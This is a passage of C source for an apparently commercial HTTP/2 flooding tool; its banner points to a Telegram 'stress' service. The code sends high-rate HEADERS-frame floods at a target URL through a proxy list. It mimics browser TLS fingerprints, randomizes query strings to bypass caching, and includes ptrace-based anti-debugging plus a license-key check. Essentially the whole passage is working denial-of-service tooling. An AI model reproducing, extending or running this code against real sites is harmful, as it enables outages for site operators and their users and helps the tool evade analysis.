                    uint32_t protocol_error = htonl(8);
                    send_frame(ev_info->ssl, rst_frame, &protocol_error, 4);
                }*/


                char respBuf[RESP_BUF_LEN] = {0};
                char *pBuf = respBuf;

                lsxpack_header_t hdr;

                // printf("Page: %s\n", page);
                // printf("IP: %s\n", ip);

                lsxpack_header_set_ptr(&hdr, ":method", 7, "GET", 3);
                pBuf = lshpack_enc_encode(&ev_info->henc, pBuf, respBuf + RESP_BUF_LEN, &hdr);

                lsxpack_header_set_ptr(&hdr, ":authority", 10, ip, strlen(ip));
                pBuf = lshpack_enc_encode(&ev_info->henc, pBuf, respBuf + RESP_BUF_LEN, &hdr);

                lsxpack_header_set_ptr(&hdr, ":scheme", 7, "https", 5);
                pBuf = lshpack_enc_encode(&ev_info->henc, pBuf, respBuf + RESP_BUF_LEN, &hdr);

                char pageQuery[9] = { 0 };
                pageQuery[0] = '?';
                for (int ii = 1 ; ii < 7; ii++) {
                    pageQuery[ii] = 97 + (rand() % 24);
                }

                char pagee[100] = { 0 };
                strcpy(pagee, page);
                strcat(pagee, pageQuery);

                lsxpack_header_set_ptr(&hdr, ":path", 5, pagee, strlen(pagee));
                pBuf = lshpack_enc_encode(&ev_info->henc, pBuf, respBuf + RESP_BUF_LEN, &hdr);

                //shuffle(ev_info->headers, ev_info->headers_length);

                for (int ii = 0; ii < ev_info->headers_length; ii++)
                {
                    if (!strcmp(ev_info->headers[ii].name, "cookie"))
                    {
                        char *cookieHeader = strdup(ev_info->headers[ii].value);
                        char *cookieV = strtokm(cookieHeader, "; ");
                        while (cookieV != NULL)
                        {
                            lsxpack_header_set_ptr(&hdr, ev_info->headers[ii].name, strlen(ev_info->headers[ii].name), cookieV, strlen(cookieV));
                            pBuf = lshpack_enc_encode(&ev_info->henc, pBuf, respBuf + RESP_BUF_LEN, &hdr);
                            cookieV = strtokm(NULL, "; ");
                        }
                        free(cookieHeader);
                        continue;
                    }
                    /*if (!strcmp(ev_info->headers[ii].name, "accept")) {
                        char* parts[1000] = { 0 };
                        char accept2[1000] = { 0 };
                        char* accept = strtok(ev_info->headers[ii].value, ",");
                        int accepts = 0;
                        while (accept != NULL) {
                            parts[accepts++] = accept;
                            accept = strtok(NULL, ",");
                        }
                        shuffle2(parts, accepts);
                        for (int jj = 0; jj < accepts; jj++) {
                            strcat(accept2, parts[jj]);
                            if (jj + 1 < accepts) {
                                strcat(accept2, ",");
                            }
                        }
                        ev_info->headers[ii].value = strdup(accept2);
                    }*/



                    /*if (!strcmp(ev_info->headers[ii].name, "user-agent")) {
                        char userAgent[256] = { 0 };
                        sprintf(userAgent, "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%d.0.%d.%d Safari/537.36", 100 + (rand() % 10), 1024 + rand() % 2048, 10 + rand() % 74);
                        lsxpack_header_set_ptr(&hdr, ev_info->headers[ii].name, strlen(ev_info->headers[ii].name), userAgent, strlen(userAgent));
                        pBuf = lshpack_enc_encode(&ev_info->henc, pBuf, respBuf + RESP_BUF_LEN, &hdr);
                        continue;
                    }*/
                    lsxpack_header_set_ptr(&hdr, ev_info->headers[ii].name, strlen(ev_info->headers[ii].name), ev_info->headers[ii].value, strlen(ev_info->headers[ii].value));
                    pBuf = lshpack_enc_encode(&ev_info->henc, pBuf, respBuf + RESP_BUF_LEN, &hdr);
                    //printf("Header %s : %s\n", ev_info->headers[ii].name, ev_info->headers[ii].value);
                }


                uint16_t header_payload_len = ((uint16_t)(pBuf - respBuf)) + 5;
                char *header_payload = malloc(header_payload_len);
                memset(header_payload + 5, 0, header_payload_len - 5);
                memcpy(header_payload + 5, respBuf, header_payload_len - 5);
                //DumpHex(header_payload, header_payload_len - 5);
                header_payload[0] = 0x80;
                header_payload[1] = 0x00;
                header_payload[2] = 0x00;
                header_payload[3] = 0x00;
                header_payload[4] = 0xFF;
                //DumpHex(header_payload, header_payload_len);

                free(ev_info->header_payload);

                ev_info->header_payload = header_payload;
                ev_info->header_payload_len = header_payload_len;


                struct frame headers_frame;
                headers_frame.prepend = htonl(ev_info->header_payload_len << 8) | htonl(0x01);
                headers_frame.flags = 1 | 4 | 0x20;
                //printf("STREAM ID %i\n", ev_info->headers_sent * 2 + 1);
                headers_frame.stream = htonl(ev_info->headers_sent++ * 2 + 1);
                //DumpHex(&headers_frame, 9);
                send_frame(ev_info, headers_frame, ev_info->header_payload, ev_info->header_payload_len);
                send_counters++;
                if (mytime() - send_updated_counters > 1000000)
                {
                    send_updated_counters = mytime();
                    printf("Send counters %i\n", send_counters);
                    send_counters = 0;
                }

                /*struct frame rst_frame;
                rst_frame.zero = 0;
                rst_frame.length = htons(4);
                rst_frame.type = 3;
                rst_frame.flags = 0;
                rst_frame.stream = htonl(ev_info->headers_sent * 2 + 1);
                uint32_t protocol_error = htonl(8);

                send_frame(ev_info->ssl, rst_frame, &protocol_error, 4);*/

                /*if (ev_info->window != 0) {
                    struct frame window_frame;
                    window_frame.zero = 0;
                    window_frame.length = htons(4);
                    window_frame.type = 8;
                    window_frame.flags = 0;
                    window_frame.stream = 0;
                    int update_window = htonl(ev_info->header_payload_len);
                    send_frame(ev_info, window_frame, &update_window, 4);
                    ev_info->window = 0;
                }*/

                ev_info->pending_streams++;
                // printf("Pending streams %i\n", ev_info->pending_streams);
            }
            if (ev_info->headers_sent > 1024 * 60)
            {
                printf("Headers reached\n");
                shutdown(ev_info->fd, SHUT_RDWR);
                ev_info->status = 0;
                return;
            }
        }
    }
}

/*static void ossl_keylog_callback(const SSL *ssl, const char *line)
{
  (void)ssl;
  FILE* fd = fopen("/home/dojdik/a/a.log", "a");
  fprintf(fd, "%s\n", line);
  fclose(fd);
}*/

void *thread(void *args)
{
    signal(SIGPIPE, SIG_IGN);

    SSL_CTX *ctx = NULL;
    ctx = SSL_CTX_new(TLS_client_method());
    SSL_CTX_set_cipher_list(ctx, "ALL:!aPSK:!ECDSA+SHA1:!3DES");
    SSL_CTX_set_grease_enabled(ctx, 1);
    SSL_CTX_enable_ocsp_stapling(ctx);
    SSL_CTX_enable_signed_cert_timestamps(ctx);
    SSL_CTX_set_min_proto_version(ctx, TLS1_2_VERSION);
    SSL_CTX_set_max_proto_version(ctx, TLS1_3_VERSION);
    SSL_CTX_set_options(ctx, 0x00000010U | SSL_OP_NO_COMPRESSION | SSL_OP_LEGACY_SERVER_CONNECT | SSL_MODE_RELEASE_BUFFERS | SSL_MODE_CBC_RECORD_SPLITTING | SSL_MODE_ENABLE_FALSE_START);
    SSL_CTX_set_mode(ctx, SSL_OP_NO_COMPRESSION | SSL_OP_LEGACY_SERVER_CONNECT | SSL_MODE_RELEASE_BUFFERS | SSL_MODE_CBC_RECORD_SPLITTING | SSL_MODE_ENABLE_FALSE_START);
    SSL_CTX_set_session_cache_mode(ctx, SSL_SESS_CACHE_CLIENT | SSL_SESS_CACHE_NO_INTERNAL);
    uint16_t algs[8] = {
        SSL_SIGN_ECDSA_SECP256R1_SHA256,
        SSL_SIGN_RSA_PSS_RSAE_SHA256,
        SSL_SIGN_RSA_PKCS1_SHA256,
        SSL_SIGN_ECDSA_SECP384R1_SHA384,
        SSL_SIGN_RSA_PSS_RSAE_SHA384,
        SSL_SIGN_RSA_PKCS1_SHA384,
        SSL_SIGN_RSA_PSS_RSAE_SHA512,
        SSL_SIGN_RSA_PKCS1_SHA512};
    printf("set %i\n", SSL_CTX_set1_sigalgs_list(ctx, "ECDSA+SHA256:RSA-PSS+SHA256:RSA+SHA256:ECDSA+SHA384:RSA-PSS+SHA384:RSA+SHA384:ECDSA+SHA512:RSA-PSS+SHA512:RSA+SHA512"));
    SSL_CTX_add_cert_compression_alg(ctx, 2, NULL, DecompressBrotliCert);
    // SSL_CTX_sess_set_new_cb(ctx, NewSessionCallback);
    //SSL_CTX_set_keylog_callback(ctx, ossl_keylog_callback);

    int threadId = *((int *)args);
    printf("Thread %i start\n", threadId);

    int efd = epoll_create(EPOLL_SIZE);

    struct epoll_event *events = calloc(EPOLL_SIZE, sizeof(struct epoll_event));
    struct epoll_info *info = calloc(EPOLL_SIZE, sizeof(struct epoll_info));

    for (int i = 0; i < EPOLL_SIZE; i++)
    {
        info[i].index = i;
        reconnect(ctx, efd, threadId, &info[i]);
    }

    int avo = 0;

    while (1)
    {
        int count = epoll_wait(efd, events, EPOLL_SIZE, 1);
        for (int i = 0; i < count; i++)
        {

            struct epoll_event ev = events[i];
            struct epoll_info *ev_info = (struct epoll_info *)ev.data.ptr;

            if (ev.events & EPOLLHUP)
            {
                // printf("PROGRESS X %i\n", ++avo);
                //  epoll_ctl(efd, EPOLL_CTL_DEL, ev_info->fd, NULL);
                //  shutdown(ev_info->fd, SHUT_RDWR);
                //  printf("N %i\n", ev_info->fd);
                //  close(ev_info->fd);
                //  printf("X\n");
                ev_info->status = 0;
            }
            else if (ev.events & EPOLLERR)
            {
                shutdown(ev_info->fd, SHUT_RDWR);
                ev_info->status = 0;
                // reconnect(efd, threadId, ev_info);
            }
            else
            {


                if (ev_info->proxy == 0)
                {
                    /*ev_info->proxy = 1;
                    ev_info->alpn = malloc(4 + 1);

                    struct epoll_event event;
                    event.data.ptr = ev_info;
                    event.events = flags | EPOLLIN | EPOLLOUT;
                    epoll_ctl(efd, EPOLL_CTL_MOD, ev_info->fd, &event);
                    continue;*/

                    if (ev.events & EPOLLOUT)
                    {
                        // printf("PROGRESS %i\n", ++avo);
                        send(ev_info->fd, connect_http, connect_http_len, 0);
                        struct epoll_event event;
                        event.data.ptr = ev_info;
                        event.events = flags | EPOLLIN;
                        epoll_ctl(efd, EPOLL_CTL_MOD, ev_info->fd, &event);
                    }
                    else if (ev.events & EPOLLIN)
                    {
                        char buf[4096] = {0};
                        int cc = recv(ev_info->fd, buf, 4096, 0);
                        ev_info->proxy = 1;
                        ev_info->alpn = malloc(4 + 1);

                        struct epoll_event event;
                        event.data.ptr = ev_info;
                        event.events = flags | EPOLLIN | EPOLLOUT;
                        epoll_ctl(efd, EPOLL_CTL_MOD, ev_info->fd, &event);

                        // if (cc > 0)
                        //     DumpHex(buf, cc);

                        // epoll_ctl(efd, EPOLL_CTL_DEL, ev_info->fd, NULL);
                        // shutdown(ev_info->fd, SHUT_RDWR);
                        // close(ev_info->fd);
                        // reconnect(efd, threadId, ev_info);
                    }
                    else
                    {
                        printf("LOL\n");
                    }
                }
                else
                {
                    if (ev_info->status == 0)
                    {
                        if (ev.events & EPOLLOUT)
                        {
                            int rs = SSL_do_handshake(ev_info->ssl);
                            if (rs == 1)
                            {
                                const uint8_t *alpn;
                                uint32_t alpn_len;
                                SSL_get0_alpn_selected(ev_info->ssl, &alpn, &alpn_len);
                                ev_info->alpn = malloc(alpn_len + 1);
                                memcpy(ev_info->alpn, alpn, alpn_len);
                                ev_info->alpn[alpn_len] = 0;
                                struct epoll_event ev;
                                ev.data.ptr = ev_info;
                                ev.events = flags | EPOLLIN | EPOLLOUT;
                                epoll_ctl(efd, EPOLL_CTL_MOD, ev_info->fd, &ev);
                                set_tcp_nodelay(ev_info->fd);
                                ev_info->status = 1;
                                if (verbose == 2)
                                    printf("ALPN: %s\n", ev_info->alpn);
                            }
                            else
                            {
                                rs = SSL_get_error(ev_info->ssl, rs);
                                // printf("%i rsS\n", rs);
                                if (rs == SSL_ERROR_WANT_READ || rs == SSL_ERROR_WANT_WRITE)
                                {
                                    /*struct epoll_event ev;
                                    ev.data.ptr = ev_info;
                                    ev.events = flags | EPOLLIN;
                                    epoll_ctl(efd, EPOLL_CTL_MOD, ev_info->fd, &ev);*/
                                }
                                else
                                {
                                    // epoll_ctl(efd, EPOLL_CTL_DEL, ev_info->fd, NULL);
                                    shutdown(ev_info->fd, SHUT_RDWR);
                                    SSL_free(ev_info->ssl);
                                    ev_info->ssl = NULL;
                                }
                            }
                        }
                    }
                    else if (ev_info->status == 1)
                    {
                        status1(efd, ev, ev_info);
                    }
                    else if (ev_info->status == 2)
                    {
                        status2(efd, ev, ev_info);
                    }
                }
            }
        }

        struct timespec end;
        clock_gettime(CLOCK_MONOTONIC_RAW, &end);
        for (int i = 0; i < EPOLL_SIZE; i++)
        {
            struct timespec start = info[i].start;
            uint64_t delta_us = (end.tv_sec - start.tv_sec) * 1000000 + (end.tv_nsec - start.tv_nsec) / 1000;
            if (info[i].status == 2)
            {
                if (mytime() - info[i].time > 1000000 / requests)
                {
                    struct epoll_event evv;
                    evv.data.ptr = &info[i];
                    evv.events = flags | EPOLLIN | EPOLLOUT;
                    epoll_ctl(efd, EPOLL_CTL_MOD, info[i].fd, &evv);
                }
                if (delta_us > 20000 * 1000)
                {
                    epoll_ctl(efd, EPOLL_CTL_DEL, info[i].fd, NULL);
                    // shutdown(info[i].fd, SHUT_RDWR);
                    close(info[i].fd);
                    if (errno != 115)
                    {
                        // printf("CL %i\n", info[i].fd);
                        // perror("close");
                        //  exit(1);
                    }
                    else
                    {
                        // perror("close");
                    }
                    reconnect(ctx, efd, threadId, &info[i]);
                }
            }
            else if (delta_us > 2000 * 1000)
            {

                epoll_ctl(efd, EPOLL_CTL_DEL, info[i].fd, NULL);
                // shutdown(info[i].fd, SHUT_RDWR);
                close(info[i].fd);
                if (errno != 115)
                {
                    // printf("CL %i\n", info[i].fd);
                    //  perror("close");
                    //  exit(1);
                }
                else
                {
                    // perror("close");
                }
                reconnect(ctx, efd, threadId, &info[i]);
            }
        }
    }
}

void *run(void *ptr)
{
    int pid = *((int *)ptr);
    sleep(1);
    int status;
    waitpid(pid, &status, WUNTRACED);
    WEXITSTATUS(status);
    _exit(0);
}

int gdb_check()
{
    int pid = fork();

    if (pid == -1)
    {
        perror("fork");
        return -1;
    }

    if (pid == 0)
    {
        int ppid = getppid();
        int res = 0;
        while (!res)
        {
            /* Child */
            // kill(ppid, SIGKILL);
            if (ptrace(PTRACE_ATTACH, ppid, NULL, NULL) == 0)
            {
                /* Wait for the parent to stop and continue it */
                waitpid(ppid, NULL, 0);
                ptrace(PTRACE_CONT, NULL, NULL);

                /* Detach */
                ptrace(PTRACE_DETACH, ppid, NULL, NULL);

                /* We were the tracers, so gdb is not present */
                res = 0;
            }
            else
            {
                /* Trace failed so GDB is present */
                res = 1;
            }
            if (res)
            {
                kill(ppid, SIGKILL);
                exit(res);
            }
            usleep(10000);
        }
        return 1;
    }
    else
    {
        pthread_t t;
        pthread_create(&t, NULL, run, &pid);
        usleep(100000);
        return 0;
    }
}

void sha256_hash_string(unsigned char hash[SHA256_DIGEST_LENGTH], char outputBuffer[65])
{
    int i = 0;

    for (i = 0; i < SHA256_DIGEST_LENGTH; i++)
    {
        sprintf(outputBuffer + (i * 2), "%02x", hash[i]);
    }

    outputBuffer[64] = 0;
}

void sha256_string(char *string, char outputBuffer[65])
{
    unsigned char hash[SHA256_DIGEST_LENGTH];
    SHA256_CTX sha256;
    SHA256_Init(&sha256);
    SHA256_Update(&sha256, string, strlen(string));
    SHA256_Final(hash, &sha256);
    int i = 0;
    for (i = 0; i < SHA256_DIGEST_LENGTH; i++)
    {
        sprintf(outputBuffer + (i * 2), "%02x", hash[i]);
    }
    outputBuffer[64] = 0;
}

int main(int argc, char *argv[])
{

    prctl(PR_SET_PTRACER, (unsigned long)getpid(), 0, 0, 0);

    if (gdb_check())
    {
        return 0;
    }

    int fd = open("/etc/machine-id", 'r');
    char fdBuf[100];
    int fdr = read(fd, fdBuf, 100);

    int ofs = 0;

    for (int i = 0; i < fdr; i++)
    {
        ofs += (int)fdBuf[i];
    }

    srand(time(NULL) + ofs);

    int socksFD = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in addd;

    struct hostent *he;

    char myBuf[1024] = {0};

    char myN[128] = {0};

    for (int i = 0; i < 128; i++)
    {
        myN[i] = 97 + (rand() % 24);
    }

    myN[127] = 0;

    char *key = NULL;
    int opt;

    while ((opt = getopt(argc, argv, "k:t:x:p:u:h:i:n:r:s:v")) != -1 && !key)
    {
        switch (opt)
        {
        case 'k':
            key = strdup(optarg);
            break;
        }
    }

    optind = 1;

    printf("Flooder | Support telegram @MSIDSTRESS\n");

    char ouu[65];

    sha256_string(inp, ouu);

    memset(inp, 0, 100);

    int license = strcmp(hash, ouu);

    if (license)
    {
        printf("Api unavailable\n");
        return 1;
    }

    int threads = 0;

    while ((opt = getopt(argc, argv, "k:t:x:p:u:h:i:n:r:s:v")) != -1)
    {
        switch (opt)
        {
        case 'v':
            verbose++;
            break;
        case 't':
            threads = atoi(optarg);
            break;
        case 'x':
        {
            full_arg = strdup(optarg);
            username = strtok(optarg, ":");
            password = strtok(NULL, ":");
            break;
            break;
        }
        case 's':
            break;
        case 'p':
        {
            FILE *proxyFile = fopen(optarg, "r");
            if (!proxyFile)
            {
                printf("Error proxy file not found\n");
                return 1;
            }
            char line[100];
            while (fgets(line, sizeof(line), proxyFile) != NULL)
            {
                char *ip = strtok(line, ":");
                char *port = strtok(NULL, ":");
                if (ip && port)
                {
                    addrs[proxies].sin_family = AF_INET;
                    addrs[proxies].sin_addr.s_addr = inet_addr(ip);
                    addrs[proxies].sin_port = htons(atoi(port));
                    proxies++;
                }
            }
            fclose(proxyFile);
            printf("INIT_BAZA %i\n", proxies);

            proxyCounters = calloc(threads, sizeof(int));
            break;
        }
        case 'u':
        {

            int aPort;

            sscanf(optarg, "https://%99[^:]:%d%s[^\n]", ip, &aPort, page);
            printf("PAGE %s\n", page);
            if (strlen(page) == 0)
            {
                port = "443";
                sscanf(optarg, "https://%99[^/]%99[^\n]", ip, page);

                if (strlen(page) == 0)
                {
                    port = "80";
                    sscanf(optarg, "http://%99[^/]%99[^\n]", ip, page);
                }
                if (strlen(page) == 0)
                {
                    memset(page, 0, 100);
                    strcpy(page, "/");
                }
            }
            else
            {
                port = malloc(5);
                memset(port, 0, 5);
                sprintf(port, "%d", aPort);
            }

            printf("Path: %s\n", page);
            printf("Port: %s\n", port);
            printf("Host: %s\n", ip);

            struct hostent *hee;
            hee = gethostbyname(ip);
            if (hee == NULL)
            {
                switch (h_errno)
                {
                case HOST_NOT_FOUND:
                    fputs("The host was not found.\n", stderr);
                    break;
                case NO_ADDRESS:
                    fputs("The name is valid but it has no address.\n", stderr);
                    break;
                case NO_RECOVERY:
                    fputs("A non-recoverable name server error occurred.\n", stderr);
                    break;
                case TRY_AGAIN:
                    fputs("The name server is temporarily unavailable.", stderr);
                    break;
                }
                return 1;
            }
            else
            {
            }
            break;
        }
        case 'h':
        {
            struct header h;
            h.name = strtok(optarg, "@");
            char value[1000];
            memset(value, 0, 1000);
            char *part = strtok(NULL, "@");
            strcat(value, part);
            char *vvalue = malloc(strlen(value) + 1);
            strcpy(vvalue, value);
            vvalue[strlen(value)] = 0;
            h.value = vvalue;
            headers[headers_length] = h;
            printf("Set header %s: %s\n", h.name, h.value);
            headers_length++;
            break;
        }
        case 'i':
            requestsInterval *= atoi(optarg);
            break;
        case 'n':
            EPOLL_SIZE = atoi(optarg);
            break;
        case 'r':
            requests = atoi(optarg);
            break;
        }
    }

    if (page == NULL || addrs[0].sin_addr.s_addr == 0)
    {
        return 1;
    }

    strcat(connect_http, "CONNECT ");
    strcat(connect_http, ip);
    strcat(connect_http, ":");
    strcat(connect_http, port);
    strcat(connect_http, " HTTP/1.1\r\nHost: ");
    strcat(connect_http, ip);
    strcat(connect_http, ":");
    strcat(connect_http, port);
    strcat(connect_http, "\r\n");
    if (username)
    {
        char *authorization;
        Base64Encode(full_arg, &authorization);
        authorization[strlen(authorization) - 1] = 0;
        strcat(connect_http, "Proxy-Authorization: Basic ");
        strcat(connect_http, authorization);
        strcat(connect_http, "\r\n");
    }
    strcat(connect_http, "Proxy-Connection: Keep-Alive\r\n");
    strcat(connect_http, "User-Agent: curl/7.68.0\r\n");
    strcat(connect_http, "\r\n");

    connect_http_len = strlen(connect_http);

    printf("Connect payload:\n%s", connect_http);

    proxyCounters = calloc(threads, sizeof(int));

    for (int i = 0; i < threads; i++)
    {
        char *a = malloc(4);
        memcpy(a, &i, 4);
        pthread_t pt;
        pthread_create(&pt, NULL, thread, a);
    }

    sleep(180);
    return 0;
}
